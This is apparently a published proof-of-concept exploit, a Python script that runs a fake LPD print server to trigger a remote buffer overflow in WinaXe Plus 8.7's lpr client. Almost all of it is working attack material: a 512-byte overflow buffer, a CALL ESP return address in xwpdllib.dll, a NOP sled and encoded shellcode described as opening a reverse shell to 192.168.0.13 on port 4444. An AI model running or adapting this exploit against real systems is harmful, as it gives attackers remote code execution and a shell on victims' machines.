# Exploit Title: WinaXe Plus 8.7 - lpr remote buffer overflow
# Date: 2017-01-16
# Exploit Author: Peter Baris
# Exploit link: http://www.saptech-erp.com.au/resources/winaxe_lpr.zip
# Software Link: http://www.labf.com/download/winaxep-ok.html
# Version: 8.7
# Tested on: Windows Server 2008 R2 x64, Windows 7 SP1 x64, Windows 10 Pro x64, Windows Server 2012 R2 x64, Windows Server 2016 x64
#Start the fake LPD daemon -> Add the network printer -> Close

import socket

# WinAxe Plus 8.7 - lpr remote buffer overflow
# Author: Peter Baris
# Tested on Windows Server 2008 R2 x64, Windows 7 SP1 x64, Windows 10 Pro x64, Windows Server 2012 R2 x64, Windows Server 2016 x64
 
#reverse shell to 192.168.0.13 port 4444, length: 351 bytes, bad characters \x00\x0a\x0d
shell = ("\xb8\xb1\x79\xd9\xb5\xdb\xdc\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x43\x0e\x03\xf2\x77\x3b\x40\x08\x6f\x39"
"\xab\xf0\x70\x5e\x25\x15\x41\x5e\x51\x5e\xf2\x6e\x11\x32\xff"
"\x05\x77\xa6\x74\x6b\x50\xc9\x3d\xc6\x86\xe4\xbe\x7b\xfa\x67"
"\x3d\x86\x2f\x47\x7c\x49\x22\x86\xb9\xb4\xcf\xda\x12\xb2\x62"
"\xca\x17\x8e\xbe\x61\x6b\x1e\xc7\x96\x3c\x21\xe6\x09\x36\x78"
"\x28\xa8\x9b\xf0\x61\xb2\xf8\x3d\x3b\x49\xca\xca\xba\x9b\x02"
"\x32\x10\xe2\xaa\xc1\x68\x23\x0c\x3a\x1f\x5d\x6e\xc7\x18\x9a"
"\x0c\x13\xac\x38\xb6\xd0\x16\xe4\x46\x34\xc0\x6f\x44\xf1\x86"
"\x37\x49\x04\x4a\x4c\x75\x8d\x6d\x82\xff\xd5\x49\x06\x5b\x8d"
"\xf0\x1f\x01\x60\x0c\x7f\xea\xdd\xa8\xf4\x07\x09\xc1\x57\x40"
"\xfe\xe8\x67\x90\x68\x7a\x14\xa2\x37\xd0\xb2\x8e\xb0\xfe\x45"
"\xf0\xea\x47\xd9\x0f\x15\xb8\xf0\xcb\x41\xe8\x6a\xfd\xe9\x63"
"\x6a\x02\x3c\x23\x3a\xac\xef\x84\xea\x0c\x40\x6d\xe0\x82\xbf"
"\x8d\x0b\x49\xa8\x24\xf6\x1a\x17\x10\xf8\xd7\xff\x63\xf8\xf6"
"\xa3\xea\x1e\x92\x4b\xbb\x89\x0b\xf5\xe6\x41\xad\xfa\x3c\x2c"
"\xed\x71\xb3\xd1\xa0\x71\xbe\xc1\x55\x72\xf5\xbb\xf0\x8d\x23"
"\xd3\x9f\x1c\xa8\x23\xe9\x3c\x67\x74\xbe\xf3\x7e\x10\x52\xad"
"\x28\x06\xaf\x2b\x12\x82\x74\x88\x9d\x0b\xf8\xb4\xb9\x1b\xc4"
"\x35\x86\x4f\x98\x63\x50\x39\x5e\xda\x12\x93\x08\xb1\xfc\x73"
"\xcc\xf9\x3e\x05\xd1\xd7\xc8\xe9\x60\x8e\x8c\x16\x4c\x46\x19"
"\x6f\xb0\xf6\xe6\xba\x70\x06\xad\xe6\xd1\x8f\x68\x73\x60\xd2"
"\x8a\xae\xa7\xeb\x08\x5a\x58\x08\x10\x2f\x5d\x54\x96\xdc\x2f"
"\xc5\x73\xe2\x9c\xe6\x51") 

 

#100299DD - CALL ESP in xwpdllib.dll
buffer="A"*512+"\xdd\x99\x02\x10"+"\x90"*32+shell
port = 515              
s = socket.socket()
ip = '0.0.0.0'             
s.bind((ip, port))            
s.listen(5)                    
 
print 'Listening on LPD port: '+str(port)
 
while True:
    conn, addr = s.accept()     
    conn.send(buffer)
    conn.close()